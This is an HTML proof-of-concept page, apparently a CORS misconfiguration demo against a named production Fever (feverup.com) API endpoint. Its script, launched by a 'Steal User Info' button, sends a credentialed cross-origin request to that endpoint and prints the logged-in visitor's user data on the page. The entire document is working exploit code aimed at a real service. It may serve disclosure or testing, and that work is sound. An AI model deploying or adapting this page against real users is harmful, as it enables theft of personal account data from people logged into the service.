<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC - Fever API</title>
</head>
<body>
    <h2>CORS Exploitation Demo</h2>
    <p>Visit this page while logged into feverup.com in the same browser.</p>
    <button onclick="exploit()">Steal User Info</button>
    <pre id="result"></pre>

    <script>
    async function exploit() {
        try {
            const response = await fetch('https://data-interactive-on-site-api.prod.feverup.com/user-info', {
                method: 'GET',
                credentials: 'include',
                mode: 'cors'
            });

            if (!response.ok) throw new Error('Request failed: ' + response.status);

            const data = await response.json();
            document.getElementById('result').textContent = JSON.stringify(data, null, 2);
        } catch (err) {
            document.getElementById('result').textContent = 'Error: ' + err.message;
        }
    }
    </script>
</body>
</html>
